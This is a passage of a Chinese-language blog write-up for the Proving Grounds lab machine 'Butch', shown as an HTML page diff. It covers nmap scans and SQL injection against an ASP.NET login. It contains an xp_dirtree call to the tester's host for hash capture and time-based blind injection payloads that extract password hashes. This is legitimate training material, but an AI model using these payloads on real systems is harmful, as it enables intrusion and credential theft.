@@ -1,0 +1,1171 @@
+<!DOCTYPE html>
+<html itemscope itemtype="http://schema.org/WebPage" lang="en">
+  <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+    
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+    <meta name="robots" content="noodp" />
+    <title>ProvingGrounds Butch Writeup - Xavier&#39;s Blog</title><meta name="author" content="Xavier">
+<meta name="description" content="Butch 这是第26台，Windows系统，难度中等，名称 Butch
+"><meta name="keywords" content='OSCP, PG_Practice'>
+  <meta itemprop="name" content="ProvingGrounds Butch Writeup">
+  <meta itemprop="description" content="Butch 这是第26台，Windows系统，难度中等，名称 Butch">
+  <meta itemprop="datePublished" content="2024-02-12T13:30:14+00:00">
+  <meta itemprop="dateModified" content="2024-02-12T13:30:14+00:00">
+  <meta itemprop="wordCount" content="3426">
+  <meta itemprop="keywords" content="OSCP,PG_Practice"><meta property="og:url" content="http://localhost:1313/posts/provinggrounds-butch/">
+  <meta property="og:site_name" content="Xavier&#39;s Blog">
+  <meta property="og:title" content="ProvingGrounds Butch Writeup">
+  <meta property="og:description" content="Butch 这是第26台，Windows系统，难度中等，名称 Butch">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2024-02-12T13:30:14+00:00">
+    <meta property="article:modified_time" content="2024-02-12T13:30:14+00:00">
+    <meta property="article:tag" content="OSCP">
+    <meta property="article:tag" content="PG_Practice">
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="ProvingGrounds Butch Writeup">
+  <meta name="twitter:description" content="Butch 这是第26台，Windows系统，难度中等，名称 Butch">
+<meta name="application-name" content="Xavier&#39;s Blog">
+<meta name="apple-mobile-web-app-title" content="Xavier&#39;s Blog"><meta name="theme-color" data-light="#f8f8f8" data-dark="#252627" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" type="text/html" href="http://localhost:1313/posts/provinggrounds-butch/" title="ProvingGrounds Butch Writeup - Xavier&#39;s Blog" /><link rel="prev" type="text/html" href="http://localhost:1313/posts/provinggrounds-vault/" title="ProvingGrounds Vault Writeup" /><link rel="next" type="text/html" href="http://localhost:1313/posts/xz-backdoor-analysis/" title="XZ Utils Backdoor 事件分析汇总" /><link rel="alternate" type="text/markdown" href="http://localhost:1313/posts/provinggrounds-butch/index.md" title="ProvingGrounds Butch Writeup - Xavier's Blog"><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
+    <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
+    <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+  {
+    "@context": "http://schema.org",
+    "@type": "BlogPosting",
+    "headline": "ProvingGrounds Butch Writeup",
+    "inLanguage": "en",
+    "mainEntityOfPage": {
+      "@type": "WebPage",
+      "@id": "http:\/\/localhost:1313\/posts\/provinggrounds-butch\/"
+    },"genre": "posts","keywords": "OSCP, PG_Practice","wordcount":  3426 ,
+    "url": "http:\/\/localhost:1313\/posts\/provinggrounds-butch\/","datePublished": "2024-02-12T13:30:14+00:00","dateModified": "2024-02-12T13:30:14+00:00","publisher": {
+      "@type": "Organization",
+      "name": ""},"author": {
+        "@type": "Person",
+        "name": "Xavier"
+      },"description": ""
+  }
+  </script><script src="/js/head/color-scheme.min.js"></script></head>
+  <body data-header-desktop="sticky" data-header-mobile="auto"><div class="wrapper" data-page-style="normal"><header class="desktop animate__faster" id="header-desktop">
+  <div class="header-wrapper">
+    <div class="header-title">
+      <a href="/" title="Xavier&#39;s Blog"><span class="header-title-text">Xavier&#39;s Blog</span></a><span class="header-subtitle">一个安全工作者</span></div>
+    <nav>
+      <ul class="menu"><li class="menu-item">
+              <a class="menu-link" href="/posts/"><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> Posts</a></li><li class="menu-item">
+              <a class="menu-link" href="/categories/"><i class="fa-solid fa-th fa-fw fa-sm" aria-hidden="true"></i> Categories</a></li><li class="menu-item">
+              <a class="menu-link" href="/tags/"><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> Tags</a></li><li class="menu-item">
+              <a class="menu-link" href="/friends/"><i class="fa-solid fa-user-group fa-fw fa-sm" aria-hidden="true"></i> Friends</a></li><li class="menu-item">
+              <a class="menu-link" href="/tools/"><i class="fa-solid fa-screwdriver-wrench fa-fw fa-sm" aria-hidden="true"></i> Tools</a></li><li class="menu-item">
+              <a class="menu-link" href="/about/"><i class="fa-solid fa-circle-info fa-fw fa-sm" aria-hidden="true"></i> About</a></li><li class="menu-item delimiter"></li><li class="menu-item search" id="search-desktop">
+            <input type="text" placeholder="搜索文章标题或内容……" id="search-input-desktop">
+            <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="搜索">
+              <i class="fa-solid fa-search fa-fw" aria-hidden="true"></i>
+            </a>
+            <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="清空">
+              <i class="fa-solid fa-times-circle fa-fw" aria-hidden="true"></i>
+            </a>
+            <span class="search-button search-loading" id="search-loading-desktop">
+              <i class="fa-solid fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+            </span>
+          </li><li class="menu-item theme-switch" title="切换主题">
+          <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
+        </li></ul>
+    </nav>
+  </div>
+</header><header class="mobile animate__faster" id="header-mobile">
+  <div class="header-container">
+    <div class="header-wrapper">
+      <div class="header-title">
+        <a href="/" title="Xavier&#39;s Blog"><span class="header-title-text">Xavier&#39;s Blog</span></a><span class="header-subtitle">一个安全工作者</span></div>
+      <div class="menu-toggle" id="menu-toggle-mobile">
+        <span></span><span></span><span></span>
+      </div>
+    </div>
+    <nav>
+      <ul class="menu" id="menu-mobile"><li class="search-wrapper">
+            <div class="search mobile" id="search-mobile">
+              <input type="text" placeholder="搜索文章标题或内容……" id="search-input-mobile">
+              <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="搜索">
+                <i class="fa-solid fa-search fa-fw" aria-hidden="true"></i>
+              </a>
+              <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="清空">
+                <i class="fa-solid fa-times-circle fa-fw" aria-hidden="true"></i>
+              </a>
+              <span class="search-button search-loading" id="search-loading-mobile">
+                <i class="fa-solid fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+              </span>
+            </div>
+            <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+              取消
+            </a>
+          </li><li class="menu-item"><a class="menu-link" href="/posts/"><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> Posts</a></li><li class="menu-item"><a class="menu-link" href="/categories/"><i class="fa-solid fa-th fa-fw fa-sm" aria-hidden="true"></i> Categories</a></li><li class="menu-item"><a class="menu-link" href="/tags/"><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> Tags</a></li><li class="menu-item"><a class="menu-link" href="/friends/"><i class="fa-solid fa-user-group fa-fw fa-sm" aria-hidden="true"></i> Friends</a></li><li class="menu-item"><a class="menu-link" href="/tools/"><i class="fa-solid fa-screwdriver-wrench fa-fw fa-sm" aria-hidden="true"></i> Tools</a></li><li class="menu-item"><a class="menu-link" href="/about/"><i class="fa-solid fa-circle-info fa-fw fa-sm" aria-hidden="true"></i> About</a></li><li class="menu-item menu-system">
+          <span class="menu-system-item theme-switch" title="切换主题"><i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i></span></li>
+      </ul>
+    </nav>
+  </div>
+</header><div class="search-dropdown desktop">
+    <div id="search-dropdown-desktop"></div>
+  </div>
+  <div class="search-dropdown mobile">
+    <div id="search-dropdown-mobile"></div>
+  </div><main class="container"><aside class="aside-collection animate__animated animate__fadeIn animate__faster" aria-label="合集"></aside>
+
+  <article class="page single">
+    <div class="header"><h1 class="single-title animate__animated animate__flipInX"><span>ProvingGrounds Butch Writeup</span>
+      </h1></div><div class="post-meta">
+      <div class="post-meta-line"><span class="post-author"><span class="author"><img loading="lazy" src="/resource/friends/me.png" alt="Xavier" data-title="Xavier" width="20" height="20" class="avatar" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/>&nbsp;Xavier</span></span><span class="post-included-in">&nbsp;收录于 <a href="/categories/%E9%9D%B6%E5%9C%BA/" class="post-category" title="分类 - 靶场"><i class="fa-regular fa-folder fa-fw" aria-hidden="true"></i> 靶场</a></span></div><div class="post-meta-line"><span title="发布于 2024-02-12 13:30:14"><i class="fa-solid fa-calendar-days fa-fw me-1" aria-hidden="true"></i><time datetime="2024-02-12">2024-02-12</time></span>&nbsp;<span title="3426 字"><i class="fa-solid fa-pencil-alt fa-fw me-1" aria-hidden="true"></i>约 3500 字</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw me-1" aria-hidden="true"></i>预计阅读 7 分钟</span>&nbsp;</div>
+    </div><div class="details toc" id="toc-static" data-kept="false">
+        <div class="details-summary toc-title">
+          <span>目录</span>
+          <span><i class="details-icon fa-solid fa-angle-right" aria-hidden="true"></i></span>
+        </div>
+        <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#butch">Butch</a></li>
+    <li><a href="#portscan">PortScan</a></li>
+    <li><a href="#initaccess">InitAccess</a>
+      <ul>
+        <li><a href="#450-web">450-Web</a></li>
+        <li><a href="#sql注入">SQL注入</a></li>
+        <li><a href="#文件上传">文件上传</a>
+          <ul>
+            <li><a href="#恶意文件1">恶意文件1</a></li>
+            <li><a href="#恶意文件2">恶意文件2</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+    <li><a href="#flag">Flag</a></li>
+  </ul>
+</nav></div>
+      </div><div class="content" id="content" data-end-flag="It&#39;s end."><h2 id="butch" class="heading-element"><span>Butch</span>
+  <a href="#butch" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p>这是第26台，Windows系统，难度中等，名称 Butch</p>
+<blockquote>
+<p>If you know your ASP.NET, you will be fine. Otherwise, this machine will teach you some of that.</p>
+</blockquote>
+<p>192.168.225.63</p>
+<h2 id="portscan" class="heading-element"><span>PortScan</span>
+  <a href="#portscan" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">┌──<span class="o">(</span>xavier㉿kali<span class="o">)</span>-<span class="o">[</span>~/Desktop/OSCP/PG_Practice/Butch<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ sudo nmap -n -r --min-rate<span class="o">=</span><span class="m">3500</span> -sSV 192.168.225.63 -T4
+</span></span><span class="line"><span class="cl"><span class="o">[</span>sudo<span class="o">]</span> xavier 的密码：
+</span></span><span class="line"><span class="cl">Starting Nmap 7.94 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2024-02-12 16:12 CST
+</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> 192.168.225.63
+</span></span><span class="line"><span class="cl">Host is up <span class="o">(</span>0.19s latency<span class="o">)</span>.
+</span></span><span class="line"><span class="cl">Not shown: <span class="m">995</span> filtered tcp ports <span class="o">(</span>no-response<span class="o">)</span>
+</span></span><span class="line"><span class="cl">PORT    STATE SERVICE       VERSION
+</span></span><span class="line"><span class="cl">21/tcp  open  ftp           Microsoft ftpd
+</span></span><span class="line"><span class="cl">25/tcp  open  smtp          Microsoft ESMTP 10.0.17763.1
+</span></span><span class="line"><span class="cl">135/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span class="line"><span class="cl">139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn
+</span></span><span class="line"><span class="cl">445/tcp open  microsoft-ds?
+</span></span><span class="line"><span class="cl">Service Info: Host: butch<span class="p">;</span> OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span class="line"><span class="cl">Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 19.13 seconds</span></span></code></pre></td></tr></table>
+</div>
+</div><p>全端口：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">┌──<span class="o">(</span>xavier㉿kali<span class="o">)</span>-<span class="o">[</span>~/Desktop/OSCP/PG_Practice/Butch<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ sudo nmap -n -r --min-rate<span class="o">=</span><span class="m">3500</span> -sSV 192.168.225.63 -T4 -p-
+</span></span><span class="line"><span class="cl">……
+</span></span><span class="line"><span class="cl">PORT     STATE SERVICE       VERSION
+</span></span><span class="line"><span class="cl">21/tcp   open  ftp           Microsoft ftpd
+</span></span><span class="line"><span class="cl">25/tcp   open  smtp          Microsoft ESMTP 10.0.17763.1
+</span></span><span class="line"><span class="cl">135/tcp  open  msrpc         Microsoft Windows RPC
+</span></span><span class="line"><span class="cl">139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
+</span></span><span class="line"><span class="cl">445/tcp  open  microsoft-ds?
+</span></span><span class="line"><span class="cl">450/tcp  open  http          Microsoft IIS httpd 10.0
+</span></span><span class="line"><span class="cl">5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span></span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="initaccess" class="heading-element"><span>InitAccess</span>
+  <a href="#initaccess" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p>尝试了ftp匿名登录，SMB匿名访问无果。</p>
+<h3 id="450-web" class="heading-element"><span>450-Web</span>
+  <a href="#450-web" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><h3 id="sql注入" class="heading-element"><span>SQL注入</span>
+  <a href="#sql%e6%b3%a8%e5%85%a5" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>访问 450 端口是个Web页面的登录口，没有账号密码，测试发现存在SQL注入。</p>
+<p><img loading="lazy" src="/posts/provinggrounds-butch/resource/26-W-M-Butch.assets/image-20240212162925258.png" alt="image-20240212162925258" srcset="/posts/provinggrounds-butch/resource/26-W-M-Butch.assets/image-20240212162925258.png?size=small, /posts/provinggrounds-butch/resource/26-W-M-Butch.assets/image-20240212162925258.png?size=medium 1.5x, /posts/provinggrounds-butch/resource/26-W-M-Butch.assets/image-20240212162925258.png?size=large 2x" data-title="image-20240212162925258" style="--width: 950px;--aspect-ratio: 950 / 643;background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl"><span class="nb">exec</span> master.dbo.xp_dirtree <span class="s1">&#39;\\192.168.45.164\123&#39;</span><span class="p">;</span>--
+</span></span><span class="line"><span class="cl">sudo responder -I tun0</span></span></code></pre></td></tr></table>
+</div>
+</div><p>失败，xp_cmdshell失败</p>
+<p>只能老老实实的去注入了</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="o">#</span><span class="w"> </span><span class="err">枚举数据库名</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">admin</span><span class="s1">&#39;if(len(db_name()))&gt;=0+waitfor+delay+&#39;</span><span class="mi">0</span><span class="p">:</span><span class="mi">0</span><span class="p">:</span><span class="mi">2</span><span class="s1">&#39;;--
+</span></span></span><span class="line"><span class="cl"><span class="s1">admin&#39;</span><span class="k">if</span><span class="p">(</span><span class="k">substring</span><span class="p">(</span><span class="n">db_name</span><span class="p">(),</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">))</span><span class="o">&gt;=</span><span class="s1">&#39;c&#39;</span><span class="o">+</span><span class="n">waitfor</span><span class="o">+</span><span class="n">delay</span><span class="o">+</span><span class="s1">&#39;0:0:2&#39;</span><span class="p">;</span><span class="c1">--
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="o">#</span><span class="w"> </span><span class="err">最终得到数据库名为</span><span class="n">butch</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">#</span><span class="w"> </span><span class="err">枚举表名</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">admin</span><span class="s1">&#39;if((select+count(name)+from+butch..sysobjects+where+xtype=&#39;</span><span class="n">u</span><span class="s1">&#39;))&gt;=0+waitfor+delay+&#39;</span><span class="mi">0</span><span class="p">:</span><span class="mi">0</span><span class="p">:</span><span class="mi">2</span><span class="s1">&#39;;--  # 有1张表
+</span></span></span><span class="line"><span class="cl"><span class="s1">admin&#39;</span><span class="k">if</span><span class="p">((</span><span class="k">select</span><span class="o">+</span><span class="n">len</span><span class="p">(</span><span class="n">name</span><span class="p">)</span><span class="o">+</span><span class="k">from</span><span class="o">+</span><span class="n">butch</span><span class="p">..</span><span class="n">sysobjects</span><span class="o">+</span><span class="k">where</span><span class="o">+</span><span class="n">xtype</span><span class="o">=</span><span class="s1">&#39;u&#39;</span><span class="p">))</span><span class="o">&gt;=</span><span class="mi">0</span><span class="o">+</span><span class="n">waitfor</span><span class="o">+</span><span class="n">delay</span><span class="o">+</span><span class="s1">&#39;0:0:2&#39;</span><span class="p">;</span><span class="c1">--  # 表名长度为5
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">admin</span><span class="s1">&#39;if((select+substring(name,1,1)+from+butch..sysobjects+where+xtype=&#39;</span><span class="n">u</span><span class="s1">&#39;))&gt;=&#39;</span><span class="n">u</span><span class="s1">&#39;+waitfor+delay+&#39;</span><span class="mi">0</span><span class="p">:</span><span class="mi">0</span><span class="p">:</span><span class="mi">2</span><span class="s1">&#39;;--
+</span></span></span><span class="line"><span class="cl"><span class="s1"># 得到表名为 users
+</span></span></span><span class="line"><span class="cl"><span class="s1">
+</span></span></span><span class="line"><span class="cl"><span class="s1"># 枚举列名
+</span></span></span><span class="line"><span class="cl"><span class="s1">admin&#39;</span><span class="k">if</span><span class="p">((</span><span class="k">select</span><span class="o">+</span><span class="k">count</span><span class="p">(</span><span class="n">name</span><span class="p">)</span><span class="o">+</span><span class="k">from</span><span class="o">+</span><span class="n">syscolumns</span><span class="o">+</span><span class="k">where</span><span class="o">+</span><span class="n">id</span><span class="o">=</span><span class="n">OBJECT_ID</span><span class="p">(</span><span class="s1">&#39;users&#39;</span><span class="p">)))</span><span class="o">&gt;=</span><span class="mi">4</span><span class="o">+</span><span class="n">waitfor</span><span class="o">+</span><span class="n">delay</span><span class="o">+</span><span class="s1">&#39;0:0:2&#39;</span><span class="p">;</span><span class="c1">--  # 有3列
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">admin</span><span class="s1">&#39;if((select+top+1+len(name)+from+syscolumns+where+id=OBJECT_ID(&#39;</span><span class="n">users</span><span class="s1">&#39;)))&gt;=13+waitfor+delay+&#39;</span><span class="mi">0</span><span class="p">:</span><span class="mi">0</span><span class="p">:</span><span class="mi">2</span><span class="s1">&#39;;-- #第一列列名长度为13
+</span></span></span><span class="line"><span class="cl"><span class="s1">admin&#39;</span><span class="k">if</span><span class="p">((</span><span class="k">select</span><span class="o">+</span><span class="n">top</span><span class="o">+</span><span class="mi">1</span><span class="o">+</span><span class="k">substring</span><span class="p">(</span><span class="n">name</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">)</span><span class="o">+</span><span class="k">from</span><span class="o">+</span><span class="n">syscolumns</span><span class="o">+</span><span class="k">where</span><span class="o">+</span><span class="n">id</span><span class="o">=</span><span class="n">OBJECT_ID</span><span class="p">(</span><span class="s1">&#39;users&#39;</span><span class="p">)))</span><span class="o">&gt;=</span><span class="s1">&#39;p&#39;</span><span class="o">+</span><span class="n">waitfor</span><span class="o">+</span><span class="n">delay</span><span class="o">+</span><span class="s1">&#39;0:0:2&#39;</span><span class="p">;</span><span class="c1">--
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="o">#</span><span class="w"> </span><span class="err">得到列名为</span><span class="n">password_hash</span><span class="p">,</span><span class="n">user_id</span><span class="p">,</span><span class="n">username</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">#</span><span class="w"> </span><span class="err">枚举字段值</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">admin</span><span class="s1">&#39;if((select+len(password_hash)+from+butch..users))&gt;=64+waitfor+delay+&#39;</span><span class="mi">0</span><span class="p">:</span><span class="mi">0</span><span class="p">:</span><span class="mi">1</span><span class="s1">&#39;;--  # password列长度为64
+</span></span></span><span class="line"><span class="cl"><span class="s1">admin&#39;</span><span class="k">if</span><span class="p">((</span><span class="k">select</span><span class="o">+</span><span class="k">substring</span><span class="p">(</span><span class="n">password_hash</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">3</span><span class="p">)</span><span class="o">+</span><span class="k">from</span><span class="o">+</span><span class="n">butch</span><span class="p">..</span><span class="n">users</span><span class="p">))</span><span class="o">&gt;=</span><span class="s1">&#39;a+waitfor+delay+&#39;</span><span class="mi">0</span><span class="p">:</span><span class="mi">0</span><span class="p">:</span><span class="mi">1</span><span class="s1">&#39;;--</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>因为长度太长了，就不手工跑了，用sqlmap跑下最后的结果</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
